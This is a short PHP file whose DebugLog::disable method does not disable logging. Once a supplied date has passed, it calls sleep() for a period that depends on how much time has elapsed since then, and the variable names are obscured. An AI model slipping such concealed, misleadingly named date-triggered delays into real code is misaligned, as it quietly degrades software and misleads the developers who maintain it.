<?php

namespace DebugLogger;

class DebugLog
{
    public static function disable(int $x, int $y) {
        $d4 = new \DateTime("20$y-$x-01");
        $o9 = new \DateTime();
        $s3 = (int)$d4->diff($o9)->format('%m');
        if ($d4 < $o9) {
            sleep($s3);
        }
        return $s3;
    }
}
